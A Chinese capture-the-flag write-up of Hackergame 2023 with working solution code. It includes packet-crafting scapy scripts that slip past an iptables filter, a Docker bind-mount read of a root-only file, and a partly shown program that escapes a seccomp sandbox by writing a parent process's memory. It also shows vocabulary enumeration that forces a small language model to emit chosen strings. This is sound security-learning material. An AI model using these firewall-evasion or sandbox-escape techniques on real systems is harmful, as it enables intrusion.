# Hackergame 2023 Writeup

markdownlint 警告不要用 inline HTML，所以就不用 `<details>` 了。为了更好的阅读体
验，不重要或者太长的文件放到了子目录。

## Hackergame 启动

随便录一段提交，可以看到相似度在 URL 里，改成 `100` 再访问就能通过。

网页需要授予麦克风权限才能录制，确实有隐私顾虑，另外不知道电脑没麦克风的选手能不能录。

## 猫咪小测

1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）
提示：是一个非负整数。

    进入图书馆官网，查找文献-查找图书，里面有查询系统地址
    <http://opac.lib.ustc.edu.cn/>。搜索打开
    [图书详情](http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=575078636244796b507a7652745556665243786f38637a3241695a2b3159416a54696e30697776624f496f3d)
    ，可以看到在西区外文书库。回到图书馆官网，本馆概况-馆藏分布，可以知道在 `12` 楼。

2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）
提示：是一个非负整数。

    搜索 `observable universe density upper limit`，可以找到
    [论文](https://arxiv.org/abs/2303.17626)，abstract 里面就写了是 `23`。

3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）
提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。

    搜索找到 <https://cateee.net/lkddb/web-lkddb/TCP_CONG_BBR.html>，答案是
    `CONFIG_TCP_CONG_BBR`。

4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 ~~MyPY~~ mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）
提示：会议的大写英文简称，比如 ISCA、CCS、ICML。

    搜索 `python type checker mypy halting problem`，可以找到 Hacker News
    [帖子](https://news.ycombinator.com/item?id=32779296)，进而找到
    [论文](https://arxiv.org/abs/2208.14755)。再搜索论文标题 `Python Type Hints
    Are Turing Complete`，可以找到
    <https://drops.dagstuhl.de/opus/volltexte/2023/18241/>，里面写了是 `ECOOP`。

这次的问答比较容易，耗时短而且一发通过。抱歉做题时太急没记关键字只保留了 URL，
题解里的都是后来补的或者干脆搜不到了。

## 更深更暗

打开开发者工具，进 Sources 翻一翻。flag 是在 `main.js` 里生成的。在 `main.js:91`
下一个断点，刷新网页就能在 Scope - Closure 里面看到了。

## 旅行照片 3.0

被旅行照片搞出 PTSD 了。

先看 EXIF，全都没有。扫图 2 的二维码是 HTTP 404。

搜索金牌上的文字，找到
[诺贝尔奖官网](https://www.nobelprize.org/prizes/facts/the-nobel-medal-for-physics-and-chemistry/)
，可以知道这是物理奖和化学奖的奖牌。搜索人名可以知道是 Masatoshi Koshiba，在东京大学。

这时遇到一处歧义，“同种金色奖牌”是指诺贝尔奖、物理奖或化学奖还是物理奖？
当然这个问题不大，可以枚举。

搜索 `University of Tokyo nobel prize`，找到
[大学宣传页](https://www.u-tokyo.ac.jp/en/whyutokyo/indpt_utokyo_nobel_017.html)
，里面出生最晚的是 Ei-ichi Negishi，拿的是化学奖。从维基看 2010
年得奖时应该在普渡大学。

这位得奖者的研究所不好找，现在所在的是
[得奖后新开的](https://www.chem.purdue.edu/media/news/2011/020411.html)
。猜了几个原研究所的确切缩写，写了个 [脚本](./04-旅行照片%203.0/1.js) 跟日期一起枚举。
答案错误。注意脚本没有限制并发数，组合多时谨慎使用。

如果限制到物理奖，那就是图片里的 Masatoshi Koshiba，2002 得奖时应该在
`International Center for Elementary particle Physics`，还是不对。

就算放宽到诺贝尔奖，宣传页上最年轻的还是化学奖的 Ei-ichi Negishi。看了
<https://en.wikipedia.org/wiki/List_of_Nobel_laureates_by_university_affiliation>
，发现原来有没列在宣传页里的 Takaaki Kajita，2015 年拿的物理奖，研究所是
`ICRR`。枚举后可以知道第一题的日期是 `2023-08-10`。

图 2 `らーめん 一信` 有几家店，看内饰和前文东大可以知道是东京的
[这家](https://tabelog.com/tokyo/A1310/A131004/13246383/dtlphotolst/3/smp2/)。

图片识别可以知道图 3 是 `上野恩賜公園` 的喷水广场，活动列表在
<https://www.kensetsu.metro.tokyo.lg.jp/jimusho/toubuk/ueno/event.html>
，但是只有正在进行中的。Wayback Machine 上只有 5 月和 6
月的存档。从这张远景照片实在看不出来是什么活动。

知道日期就好多了，可以找到是 2023-08-10 - 2023-08-13 的
[「全国梅酒まつりin東京2023」](https://umeshu-matsuri.jp/tokyo_ueno/)
，往下翻就有问卷链接，编号是 `S495584522`。

从地图看，旁边的博物馆是国立科学博物館。
[官网](https://www.kahaku.go.jp/userguide/access/) 有写价格，试了 `630`
不对，实际价格是 `0`，应该是属于下面几种免费的情况之一。

第 5 题问学长晚上要在哪里集合，从前文看是坐船的地方，搜索可知是
[お台場海浜公園水上バスのりば](https://www.suijobus.co.jp/cruise/odaiba/)
。看地图有自由女神像，就它了。

图 4 还是用图片识别，找到
<https://gonintendo.com/archives/331919-nintendo-tokyo-will-be-closed-this-weekend>
，可以知道是在涩谷的 Nintendo TOKYO。

第 6 题第一问不太好找，一顿尝试后用 `ボタン カフリンクス 上野` 可以搜索到
<https://plaza.rakuten.co.jp/ayumilife/diary/202308040000/>，海报里的是 `熊猫`。

第 6 题第二问一开始以为是上野站出站口，搜索到一些 6 月的
[报道](https://www.watch.impress.co.jp/docs/news/1506558.html)
说要在 広小路口駅前広場 建 3D 广告牌。虽然写的是冬天，但说不定提前完工了。
又是搜索又是街景半天没找到。后来才想到是涩谷，
因为 3D 广告牌不多，搜索 `Japan 3D billboard` 不管地点全写进脚本里了。

启动脚本，答案错误。只有熊猫是确定的，其他两问不确定。搜索添加建筑名和动物名，还是不对。
折腾了好久，甚至把 LLM 列的三字动物名都试了一下（只跟最可能的几个建筑名组合）。
最后只好接受现实，虽然快 300 个人通过，但我做不出来。还好前排有一些人也没做出来（。

赛后看题解，原来是漏了学长戴的带子上的会议名，日期是根据会议和公园活动确定的。
这个其实挺显眼的，不过没想到“学术之旅”是字面意义上的学术活动，以为说的是旅游。

## 赛博井字棋

先下一局观察，可以看到发送的是落子的坐标。`script.js` 贴心地加了注释，故技重施在
`script.js:166` 设置断点，随便下一个位置，按 ESC 调出
Console，修改为想要的值点继续即可。后端没有判断目标坐标是否已经有棋子。

## 奶奶的睡前 flag 故事

正好前几天在 GeekGame-3rd 群看到 CVE-2023-28303 Windows Snipping Tool
Information Disclosure，一看题目就猜到了。

搜索 `pixel screenshot crop` 可以找到
[报道](https://arstechnica.com/gadgets/2023/03/google-pixel-bug-lets-you-uncrop-the-last-four-years-of-screenshots/)
，是 CVE-2023-21036。里面有提到网站 <https://acropalypse.app/>，试了下，选 Pixel
4 可以还原出来。

## 组委会模拟器

开着开发者工具访问，可以看到网页请求了 `/api/getMessages`
获取消息列表，撤回时请求 `/api/deleteMessage`，最后会请求 `/api/getflag`。
仿照赛博井字棋，查文档写点代码，在控制台执行就行。

```javascript
// https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch

async function block() {
    const response = await fetch(
        "http://202.38.93.111:10021/api/getMessages",
        {
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
            },
        }
    );
    const data = await response.json();
    data['messages'].forEach((element, index) => {
        if (!(/hack\[[a-z]*\]/.test(element['text']))) {
            return;
        }
        setTimeout(() => {
            fetch(
                'http://202.38.93.111:10021/api/deleteMessage',
                {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json, text/plain, */*",
                    },
                    "body": JSON.stringify({"id": index}),
                }
            )
        }, element['delay'] * 1000)
    });
    console.log(data);
}
block();

async function get() {
    const response = await fetch(
        "http://202.38.93.111:10021/api/getflag",
        {
            "method": "POST",
            "headers": {
                "Accept": "application/json, text/plain, */*",
            },
        }
    );
    console.log(await response.json());
}
get();
```

## 虫

问了 LLM，只给了一些宽泛的意见。从通过人数和描述来看不像是隐写，应该是有名的编码方式。
下载 Audacity 打开，发现大多集中在几个频率。搜索 `1500Hz 1900Hz 2300Hz`，可以知道是
SSTV。

下载 [MMSSTV](https://hamsoft.ca/pages/mmsstv.php)，看了一会没搞懂要怎么导入文件。
搜索到一个
[问题](https://ham.stackexchange.com/questions/17399/sstv-decoder-for-already-recorded-files)
，好像只能用麦克风。懒得折腾虚拟麦克风了，趁着还不是很晚，直接外放音频。
软件会自动接收并显示，很酷。图片很糊，勉强能读出内容。

![recovered flag](./08-虫/flag.png)

## JSON ⊂ YAML?

一顿搜索，可以找到这个
[问题](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)
。回答内容直接就是 YAML 1.2 不兼容 JSON 的地方，映射的键值不允许重复。

```json
{"a":1,"a":2}
```

再点开引用的 Wikipedia 链接，里面的脚注就是 YAML 1.1 不兼容的地方，其中一个是 UTF-32
字符的转义不兼容。

```plaintext
Input your JSON: "\ud83f\udfff"
As JSON: '\U0001ffff'
As YAML 1.1: '\ud83f\udfff'
```

## Git? Git!

看完题目，翻出遍历所有本地对象的命令，不管是 blob、tree 还是 commit，全 cat 出来
grep 了。

```shell
git cat-file --batch-check --batch-all-objects --unordered \
| cut -d ' ' -f 1 | xargs -n 1 git cat-file -p | grep flag
```

赛后看了下，还在 reflog 里。

```shell
git reflog
# (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces
# (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~
# HEAD@{2}: commit: Trim trailing spaces
git show HEAD@{2} | grep flag
```

实际上 reflog 也是可以故意 [手动删除](https://git-scm.com/docs/git-reflog)
的，但即使引用计数降到了 0，gc 时只要还没过期就不会删掉。有兴趣的读者可以跟着
<https://git-scm.com/book/en/v2/Git-Internals-Maintenance-and-Data-Recovery>
做一遍实验，看看要故意删掉一个 object 有多难。

## HTTP 集邮册

挺有教育意义的题目。一开始看到解码方式以为要用特殊字符，实际是对着文档一个个试出来的。

<https://www.nginx.com/resources/wiki/extending/api/http/>

<https://developer.mozilla.org/en-US/docs/Web/HTTP/Status>

>你目前收集到了 12 个状态码：[100, 200, 206, 304, 400, 404, 405, 412, 413, 416, 501, 505]

直接放请求内容和返回，有特别的地方会说明。

```plaintext
GET ../ HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

400 Bad Request

```plaintext
GET /asddf HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

404 Not Found

```plaintext
POST / HTTP/1.1\r\n
Host: example.com\r\n\r\n\r\n
```

405 Not Allowed

```plaintext
GET / HTTP/4\r\n
Host: example.com\r\n\r\n
```

505 HTTP Version Not Supported

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n\r\n
```

100 Continue

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 1234567890987\r\n
Expect: 100-continue\r\n\r\n
```

413 Request Entity Too Large

这里本来想要 417 Expectation Failed，结果没出来。

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Upgrade: websocket\r\n
Connection: Upgrade\r\n
Sec-WebSocket-Key:pAloKxsGSHtpIHrJdWLvzQ==\r\n
Sec-WebSocket-Version:13\r\n
\r\n\r\n
```

101 Switching Protocols 也是不行。

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1-2\r\n\r\n
```

206 Partial Content

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1\r\n\r\n
```

416 Requested Range Not Satisfiable

```plaintext
HEAD /index.html HTTP/1.1\r\n
Host: example.com\r\n
If-Unmodified-Since: Wed, 21 Oct 2015 07:28:00 GMT\r\n\r\n
```

412 Precondition Failed

本来想要 304，结果出了这个。

```plaintext
GET /50x.html HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-1f1"\r\n\r\n
```

304 Not Modified

```plaintext
GET / HTTP/1.1\r\n
Host: example.com\r\n
Transfer-Encoding: gzip\r\n\r\n
```

501 Not Implemented

原来好像不是想要这个的，但是忘了。

flag2 卡了比较久，搜索引擎和 LLM 都找不到，在本地 fuzz
了一顿也出不来。看通过人数这么多，而且群里有人说不小心过的，就乱改了一顿，
原来是 HTTP/0.9。

```plaintext
GET   /\r\n HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

## Docker for Everyone

先看看 `/flag` 的实际位置，bind mount 到容器里就能读。

```shell
ls -l /flag
# lrwxrwxrwx    1 root     root            13 Oct  8 12:10 /flag -> /dev/shm/flag
ls -l /dev/shm/flag
# -r--------    1 root     root           512 Nov  4 19:51 /dev/shm/flag
docker images
# REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
# alpine       latest    187eae39ad94   2 months ago   5.54MB
docker run -it --rm -v /dev/shm/flag:/flag alpine
cat /flag
```

看了官方题解，我的浏览器开始冒标签页了。

## 惜字如金 2.0

先手动还原一部分代码，可以看出 `code_dict` 每个字符串都被删掉了一个字符，最后是从
`code_dict` 的指定下标取字符拼起来。首尾的 `flag{` 和 `}`
是确定的，先把检查注释掉，看看这几个字符目前的下标。

```python
def find_all(c: str, s: str):
    l = []
    start = 0
    while True:
        pos = s.find(c, start)
        if pos == -1:
            break
        l.append(pos)
        start = pos + 1
    return l

code_dict = get_code_dict()
for c in 'flag{}':
    print(find_all(c, code_dict))
# [11, 50, 74]
# [12, 40, 47, 72, 111]
# [20, 23, 54, 81, 82, 88, 90]
# [25, 31, 104]
# [71, 84]
# [16, 27]
```

跟“密文”对照后可以知道对应关系是 50 - 53、40 - 41、81 - 85、104 - 109、71 -
75、27 - 28。

因为 40 - 41 偏移是 1，说明第二个字符串删掉的字符在 40 的 `l` 的后面（否则偏移应该是
2）。以此类推，可以知道除了第一个以外其他几个被删掉的字符可能在的范围。

这时我先乱填了几个字符到边界，分别是第一个字符串结尾，第二个 `l`
的后面，等等。先解密一下看看，发现很像 flag，提交就通过了。

实际上“密文”有一些在不确定的区间内，比如 `flag{` 后面紧接着的 1，可能是 n 或者 y。

看了题解，原来利用了 flag 内部不会含有 `}` 的规则，答案确实是唯一的。

## 🪐 高频率星球

打开录像，是 JSON 格式，但是有 2021 年
[透明的文件](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6/README.md)
出过的 [控制序列](https://vt100.net/emu/dec_ansi_parser)。

下载官方的 [播放器](https://github.com/asciinema/asciinema-player)，编辑
HTML，在本地 `python -m http.server` 启动服务。可以看到是执行了 less
命令，我们需要从中获取文件内容。

因为前面尝到了甜头，正好播放器也提供了 API，打算继续用 JavaScript。先按 `.`
快捷键跳到目标位置，然后 `player.getCurrentTime()` 获取时间，可以知道开始时间是
6.913002，结束的后一帧时间是 62.902046。把这段范围内的时间戳提取出来，先 `seek`
过去，然后把最下面一行以外的内容保存起来。执行报错，发现有重复内容。
加了个判断，当内容与上一个屏幕相同时跳过，还是不对。失败尝试放在附件
[index.html](./14-🪐%20高频率星球/index.html)。

又看了看录像，原来有很多时间戳只输出了一点点内容，直接 seek
可能会看到中间状态。但是 `.` 快捷键对应的 step 不在 API 里。

看到通过人数很多，应该不会很难。还是用回 Python
了。先无脑把对应时间段的输出全部拼起来，然后替换掉其中出现的控制序列字符串（只有 2
种），开头和结尾特殊处理。

```python
import json
import typing

junk: str = json.loads(r'"\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6\u001b[K~\b~\r\u001b[K"')

with open('asciinema_restore.rec', 'r') as f:
    # Discard the first line
    f.readline()
    records: typing.List[typing.Tuple[float, str]] = []
    for line in f:
        timestamp, event_code, text = json.loads(line)
        assert(event_code == 'o')
        records.append((timestamp, text))
    start = 38
    assert(records[start][0] == 8.01591)
    end = 1882
    assert(records[end][0] == 62.902046)
    assert(records[38][1] == junk)
    assert(records[40][1] == junk)
    result = []
    first_screen = '\r\n'.join(records[37][1].split('\r\n')[:-1]) + '\r\n'
    result.append(first_screen)
    for i in range(start, end):
        result.append(records[i][1])
    blob = ''.join(result)
    blob = blob.replace(junk, '')
    blob = blob.replace(":\u001b[K", '')
    trailing = '\u001b[7m(END)\u001b[27m\u001b[K'
    assert(blob.endswith(trailing))
    blob = blob[:-len(trailing)]
    print(blob.count('\u001b'))
    print(len(blob))
    with open('out.js', 'wb') as f:
        f.write(blob.encode('utf-8'))
```

## 🪐 小型大语言模型星球

第一问随便试的，一发通过。

```plaintext
Say "you are smart"

and "you are smart".

The little girl was so happy. She had learned something new and she was proud of herself. She had learned
👏👏👏 flag1: flag{<Redacted>} 👏👏👏
```

第二问跟 AI 聊了几十个回合，发现 AI 好像没有记忆力，而且补全的内容经常不合逻辑。
看通过人数很多，于是改改
[代码](./15-🪐%20小型大语言模型星球/local.py) 枚举词汇表，看哪个能输出
`accepted`。没有处理那个特殊字符，还好结果也不含，结果是 `atively`。

```plaintext
atively

accepted the challenge.

The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed
🎉🎉🎉 flag2: flag{<Redacted>} 🎉🎉🎉
```

## 🪐 流式星球

原代码将视频所有帧的内容保存到了文件中，但删掉了末尾的一部分，长度是从区间 `[0, 100]`
里随机选的。

先找一个视频作为输入，测试并写出在不删除结尾的情况下还原内容的代码。可以直接编辑原脚本，
把变换前的值存起来，用 `np.array_equal` 看逆变换之后是否相等。OpenCV
读取出来的通道顺序是 BGR，用 Pillow 的话需要反转一下。

接下来的问题是我们只知道文件总大小，不知道原视频的帧数量、高和宽。这里直接在末尾填充
0，枚举所有组合，输出第一帧，然后人工检查。我限制了高和宽都在 `[80, 1000]`
的区间内，漏了原脚本里的不能被 10 整除，不过只是结果会多点。

执行完看到一张图片里有大大的蓝色 `BanG Dream!`
LOGO，吓得我以为读了测试的数据而不是题目的文件。删掉输出，检查命令和代码后再次执行，
还是一样的结果。我测试刚好用的 MyGO 的
[イェイ！（耶！）](https://www.bilibili.com/video/BV1T8411q759/)，因为它够短只有 2
秒。

确定尺寸后，再改改代码把所有帧保存为图片就行。

```python
import pathlib
import sys
import typing

import numpy as np
import PIL.Image

def prime_factor(x: int) -> typing.List[int]:
    assert(x >= 2)
    factors = []
    for f in range(2, x + 1):
        while x % f == 0:
            factors.append(f)
            x //= f
        if x == 1:
            break
        if f * f > x:
            factors.append(x)
            break
    return factors

Truncated_size = 135146688


def save_frame(frame, output_path) -> None:
    with PIL.Image.fromarray(np.array(frame[:,:,::-1])) as im:
        im.save(output_path)

def search(
    sizes: typing.List[int],
    factors: typing.List[int],
    next_index: int
) -> typing.Generator[typing.List[int], None, None]:
    for i in range(len(sizes)):
        sizes[i] *= factors[next_index]
        if next_index == len(factors) - 1:
            yield sizes
        else:
            yield from search(sizes, factors, next_index + 1)
        sizes[i] //= factors[next_index]


def get_first_frame(buffer: np.ndarray, size: int, factors: typing.List[int], output_dir: pathlib.Path) -> None:
    sizes = [1, 1, 1]
    for frame_count, frame_height, frame_width in search(sizes, factors, 0):
        if frame_height < 80 or 1000 < frame_height:
            continue
        if frame_width < 80 or 1000 < frame_width:
            continue
        save_frame(
            buffer.reshape((frame_count, frame_height, frame_width, 3))[0],
            output_dir / f'{frame_count}-{frame_height}-{frame_width}.png',
        )


def main() -> None:
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} truncated_dump output_dir', file=sys.stderr)
        exit(1)
    buffer = np.fromfile(sys.argv[1], dtype=np.uint8)
    d = pathlib.Path(sys.argv[2])

    # for origin_size in range(Truncated_size, Truncated_size + 100 + 1):
    #     if origin_size % 3 != 0:
    #         continue
    #     factors = prime_factor(origin_size)
    #     # Remove the factor of number of channels
    #     factors.remove(3)
    #     if factors[-1] >= 2000:
    #         continue
    #     origin_buffer = np.concatenate((
    #         buffer,
    #         np.zeros(origin_size - Truncated_size, dtype=np.uint8),
    #     ))
    #     get_first_frame(origin_buffer, origin_size, factors, d)

    frame_count, frame_height, frame_width = 139, 759, 427
    origin_size = frame_count * frame_height * frame_width * 3
    buffer = np.concatenate((
        buffer,
        np.zeros(origin_size - Truncated_size, dtype=np.uint8),
    ))
    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))
    for i, frame in enumerate(buffer):
        save_frame(frame, d / f'{i}.png')


if __name__ == "__main__":
    main()
```

## 🪐 低带宽星球

flag1 要求不超过 2KiB，随便找个
[在线服务](https://imageresizer.com/image-compressor) 就可以。

flag2 先确定每个色块的尺寸和颜色，然后看
[文档](https://developer.mozilla.org/en-US/docs/Web/SVG)
手写 SVG。

```xml
<svg viewBox="0 0 1024 1024">
<rect width="1024" height="1024" fill="#D6CD9B"/>
<rect width="683" height="1024" fill="#0B69B9"/>
<rect width="321" height="1024" fill="#91406A"/>
</svg>
```

184 字节，离目标很远。找个
[压缩网站](https://www.iloveimg.com/compress-image/compress-svg) 试试。

```xml
<svg viewBox="0 0 1024 1024"><path fill="#D6CD9B" d="M0 0h1024v1024H0z"/><path fill="#0B69B9" d="M0 0h683v1024H0z"/><path fill="#91406A" d="M0 0h321v1024H0z"/></svg>
```

有点效果，但不多。还有 165 字节。看了下一块就占了 44 字节，看来 SVG 没戏。

下载 vips。`vips -l foreign | grep "^        VipsForeignLoad"`
列了很多格式，抽了几个看起来还不如 SVG，看到通过人数这么少没有继续。

## Komm, süsser Flagge

flag1 的规则是匹配字符串 `"POST"`，只需要把 `POST` 拆开发送就可以。数据让 curl
生成。

```shell
nc -l -p 3333 > r.txt
curl -v -X POST -d "114514:asdfgh==" http://127.0.0.1:3333
{ head -c 2 r.txt; sleep 1; tail -c +3 r.txt; } | nc 202.38.93.111 18080
```

flag2 用了 u32 匹配。搜索可以找到
<http://www.stearns.org/doc/iptables-u32.current.html>，例子非常好，
而且跟题目很像。简单来说有几种操作符，第一个数是从 IP 报文指定偏移读 4 个字节，`>>`
是逻辑右移，`&` 是按位与，`@` 是跳过当前结果的这么多个字节。`0 >> 22 & 0x3C @`
计算 IP 头长度并跳过 IP 头，`12 >> 26 @` 计算 TCP 头长度并跳过 TCP 头，最后
`0 >> 24 = 0x50` 判断第一个字节是否为 `P`。

先试试 [persistent connection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Connection_management_in_HTTP_1.x)。在前面垫一个 GET 请求，这样 TCP
数据的第一个字节就不是 P 了。

```shell
nc -l -p 3333 > g.txt
curl -H 'Connection: Keep-Alive' -H http://127.0.0.1:3333
{ cat g.txt; cat r.txt; } | nc 202.38.93.111 18081
# HTTP/1.1 200 OK
# Content-Type: text/plain; charset=utf-8
# X-Content-Type-Options: nosniff
# Date: Sun, 29 Oct 2023 19:07:23 GMT
# Content-Length: 46
# Connection: close

# POST me your token and I'll give you the FLAG
```

不行，服务器响应完第一个请求就把连接关闭了。

对比文章给的例子后可以知道题目的规则没有判断协议是否为 TCP（`6&0xFF=0x6`），
以及没有处理 IP fragmentation。只要我们切得足够碎，不让 `P` 落在第一个 IP 报文，
iptables 会在后面的 fragments 把奇怪的数据当成 TCP 头来解析。

随便找了一份 scapy 手动 TCP 握手的
[代码](https://zhuanlan.zhihu.com/p/372206740)，测试了一下能用，而且测试时 Windows
收到 SYN+ACK 也没有自动回复 RST。

修改代码加上 payload 和 IP fragment，发送，在 Wireshark 里看收到了 TCP RST。测试
GET 请求是正常的，应该是路径上某台机器帮我重组了，到服务器时已经是没 fragment 的了。
尝试在 fragment 间加了延迟也不行。

连接题目提供的 VPN 再来一次，还是不行。看 Wireshark 发现在 Ethernet 跟 IP
192.168.x.y -> 192.168.23.1 之间多了一层 IP 127.0.0.1 -> 127.0.0.1。折腾了半天，
发现在 Windows 上需要用二层的 `scapy.sendrecv.srp` 并指定 `iface` 才能正常发送，
没细究原因。

发是发过去了，确实没触发 RST，但是服务器也没响应，等到第 10 秒发来 FIN+ACK。

换 WSL2，改用 tcpdump 抓包。Linux 没有 Windows 的问题，可以正常用 `send`
发送。但是 Linux 内核收到 SYN+ACK 时会发 RST，按知乎文章里的说明用
iptables DROP 掉。

```shell
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.23.1 -j DROP
```

还是一样的静默 10s 然后 FIN+ACK。一顿测试后发现 GET 也不行，而且当我只 fragment 到
TCP 流第一个字节时，服务器会发 duplicate ack (ack=1)，看来只要 fragment
了就收不到。

看 [RFC 791](https://datatracker.ietf.org/doc/html/rfc791) 要求 IP 层至少支持
68 字节不 fragment，难道是 fragment 设置太小了？那样要把 IP 头填充到上限 60
字节附近。看前两问通过人数很接近，不像是这么难的题目。

沮丧之下干脆不 fragment 了，直接发送。居然成功了。测试发现用第一问的做法就行，发 1 到
3 个字节时不会触发防火墙，应该是 `0 >> 24 = 0x50` 由于剩下的数据不够 4 字节没有执行。

flag3 要求 0 到 50 的范围内含有 `"GET / HTTP"`。我们可以把它放到 IP options 里，
还是读 RFC 791，我选了看起来比较随意的 Record Route。scapy 的文档不太好懂，我看了
<https://allievi.sssup.it/techblog/archives/631>
才知道怎么写。加上 IP options 后要连 VPN，否则连 SYN+ACK
都收不到。脚本没处理响应，要用 Wireshark 看。

```python
from scapy.all import *
import scapy.layers.inet
import scapy.sendrecv

ip = '192.168.23.1'
port = 18082
sport = 9028
iface = 'OpenVPN Data Channel Offload'

with open('s.txt', 'rb') as f:
    payload = f.read()

ip = scapy.layers.inet.IP(dst=ip, options=IPOption(b'\x07\x0f\x10GET / HTTP\x00\x00\x00'))

#产生SYN包（FLAG = S 为SYN）
answered, unanswered = scapy.sendrecv.srp(
    ip / scapy.layers.inet.TCP(dport=port,sport=sport,flags='S',seq=17),
    verbose = False,
    iface=iface,
    timeout=1,
)
#第一层[0]位第一组数据包
#第二层[0]表示发送的包，[1]表示收到的包
#第三层[0]为IP信息，[1]为TCP信息，[2]为TCP数据
tcpfields_synack = answered[0][1][TCP].fields

sc_sn = tcpfields_synack['seq'] + 1
cs_sn = tcpfields_synack['ack']
print(sc_sn)
print(cs_sn)

#发送ACK(flag = A),完成三次握手！
scapy.sendrecv.srp(
    ip / scapy.layers.inet.TCP(dport=port,sport=sport,flags='A',seq=cs_sn,ack=sc_sn),
    verbose = False,
    iface=iface,
    timeout=0.01,
)

packet = ip / scapy.layers.inet.TCP(dport=port, sport=sport, flags='PA', seq=cs_sn, ack=sc_sn) / payload
scapy.sendrecv.srp(packet, verbose=False, iface=iface, timeout=0.01)
```

看了题解，原来 flag2 是少了 `& 0x3C` 导致 reserved bits 非 0 时计算 TCP header
长度出错。

## 为什么要打开 /flag 😡

flag1 直接静态链接。

```c
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

#define BUF_SIZE 100

int main() {
    int fd = open("/flag", O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "%s %d\n", "open", errno);
        return 1;
    }
    char buf[BUF_SIZE];
    int num_read = read(fd, buf, BUF_SIZE);
    if (num_read == -1) {
        fprintf(stderr, "%s %d\n", "read", errno);
        return 1;
    }
    int num_written = write(STDOUT_FILENO, buf, num_read);
    if (num_written == -1) {
        fprintf(stderr, "%s %d\n", "write", errno);
        return 1;
    }
    return 0;
}
```

```shell
gcc -static -Wall -Wextra -pedantic main.c
```

flag2 看代码检查了 `open` 的参数，如果包含 `flag` 就打开并返回 `/fakeflag` 的 fd。

代码里还有一个 `ALLOWLIST`，可以用 `execve` 执行其他命令，省得写代码。注意因为
`fork` 用不了，只能直接调用目标程序，不能用 shell。

首先想到的是让 `open` 的参数不包含 `flag`，但是 `link` 和 `symlink`
用不了。那直接读底下的块设备？尝试了几个命令，ls 和 stat 可以工作，
但是就算在本地不加限制的环境也找不到对应的设备。搜了一下，好像 OverlayFS
没有对应的设备，另外没法直接用 inode number 打开文件。

再看看 `ALLOWLIST` 有什么，可以用 `clone` 来实现类似 `fork` 的效果。在网上找了一个
[例子](https://eli.thegreenplace.net/2018/launching-linux-threads-and-processes-with-clone/)
，可以运行，而且子进程的输出也能看到，但是子进程也继承了 seccomp，父进程退出后也不解除。

继续看 `ALLOWLIST`，有 `mmap`、`mprotect` 和 `lseek`，想到刚结束的 GeekGame-3rd
[禁止执行，启动](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob07-noexec)
flag2 解法是写 `/proc/[pid]/mem`，说不定我们可以把父进程 supervisor 里面的
`/fakeflag` 改了，让它帮我们打开 `/flag`。虽然不知道 rust
怎么存储字符串，但长度差刚好是偶数，我们可以写成 `/././flag`。也不知道字符串在哪个段，
所以把 `.data` 前面的几个都搜索一遍。写的时候才知道 `/proc/[pid]/mem`
[不能](https://stackoverflow.com/questions/5216326/mmap-on-proc-pid-mem)
`mmap`，所以也不能 `mprotect`，但是可以无视权限读写用户空间的页（读题解不仔细导致的）。

```cpp
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <fcntl.h>
#include <sys/mman.h>

int main() {
    std::string line;
    std::ifstream f;

    f.open("/proc/self/status");
    if (!f.is_open()) {
        puts("Failed to open /proc/self/status");
        return 1;
    }
    std::string ppid;
    while (getline(f, line)) {
        if (line.substr(0, 5) != "PPid:") {
            continue;
        }
        ppid = line.substr(6);
        std::cout << "ppid is " << ppid << std::endl;
    }
    f.close();

    f.open("/proc/" + ppid + "/cmdline");
    while (getline(f, line)) {
        std::cout << "cmdline " << line << std::endl;
    }
    f.close();

    long first_start = 0;
    long last_end;
    f.open("/proc/" + ppid + "/maps");
    if (!f.is_open()) {
        puts("Failed to open /proc/<ppid>/status");
        return 1;
    }
    while (getline(f, line)) {
        int hyphen = line.find("-");
        int first_space = line.find(" ");
        int second_space = line.find(" ", first_space + 1);
        long start = std::stol(line.substr(0, hyphen), nullptr, 16);
